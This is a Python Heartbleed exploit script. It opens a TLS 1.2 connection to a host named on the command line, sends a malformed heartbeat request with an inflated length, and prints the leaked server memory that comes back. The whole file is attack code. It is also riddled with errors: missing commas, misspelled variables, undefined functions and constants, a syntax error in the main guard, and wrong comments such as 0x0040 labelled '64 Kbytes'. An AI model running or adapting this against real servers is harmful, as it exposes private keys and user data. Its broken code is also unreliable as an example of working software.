import sys
import socket
import struct
import select
import array

clientHello = (
	0x16, # Type: Handshake
	0x03, 0x03, # Version TLS: TLS 1.2
	0x00, 0x2f, # Packet length: 47 bytes
	0x01, # Type message: Client Hello
	0x00, 0x00, 0x2b, # Message length: the remaining 43 bytes
	0x03, 0x03, # TLS client version: the client supports TLS 1.2
	# Client random values(nonce-number)
	0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x00, 0x01,
	0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x03, 0x04,
	0x05, 0x06, 0x07, 0x08, 0x09, 0x12, 0x13, 0x14, 0x15, 0x16,
	0x17, 0x18
	
	0x00 # Length of the session ID
	0x00, 0x02, # The length of the field with the list of cipher suites: 2 bytes
	0x00, 0x2f, # Cipher Suite - TLS_RSA_WITH_AES_128_CDC_SHA)
	0x01, 0x00, # Reduction: length 0x1 bytes & 0x00 (without reduction)
	0x00, 0x00, # Extension block length: 0, without extensions
)

def recv_all(socket, length):
	response = b''
	total_bytes_remaining = length
	while total_bytes_remaining > 0:
		readable, writeable, error = select.select([socket], [], []) # select is used to monitor the socket
		if socket in readable:
			data = socket.recv(total_bytes_remaining) # the socket tries to read the remaining bytes from the socket buffer
			response += data
			total_bytes_remeining -= len(data)
	return respose

def readPacket(socket):
	headerLength = 6
	payload = b''
	header = recv_all(socket, headerLength) # reading six bytes from the socket
	print(header.hex(" "))
	if header != b'':
		type, version, length, msgType = struct,unpack('>BHHB', header) # decompressing bytes into four variables
		if length > 0:
			payload += recv_all(socket, length - 1) # if length is greater than 0, then we can read the remaining bytes of the data packet from the socket.
	else:
		print("Respose has no header")
	return type, version, payload, msgType

heartbeat = (
	0x18, # Type: Heartbeat-message
	0x03, 0x03, # Version TLS: TLS 1.2
	0x00, 0x03 # Packet length: 3 bytes
	0x01, # Heartbeat-request
	0x00, 0x40 # Payload Length: 64 Kbytes
)

def readServerHeartBeat(socket):
	payload = b''
	for i in range(0, 4):
		type, version packet_payload, msgType = readPacket(socket) # Reading four Heartbeat-responses
		payload += packet_payload # combining the payload of four responses into one payload
	return(type, version, payload, msgType)

def exploit(socket):
	HEART_BEAT_RESPONSE = 21 # 0x15 # Heartbeat-answer
	payload = b''
	socket.send(array.array('B', heartbeat)) # Sending a distorted request
	print("Sent Heartbeat ")
	type, version, payload, msgType = readServerHeartBeat(socket) # Reading four Heartbeat type packets is the answer
	if type is not None:
		if msgType == HEART_BEAT_RESPONSE:
			print(payload.decode('utf-8')) # Displaying the payload contents
	else:
		print("No heartbeat received")
	socket.close()

def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 443)) # connecting to the IP address that was passed as a command line argument
	s.send(array.array('B', clientHello)) # TLS v1.2 Connection Initiation
	serverHelloDone = False
	while not serverHelloDone: # Listening to reply messages, checking their type
		type, version, payload, msgType = readPackets(s)
		if (msgType == SERVER_HELLO_DONE):
			serverHelloDone = True
	exploit(s) # calling the exploit() function
if __name__ = '__main__':
	main()
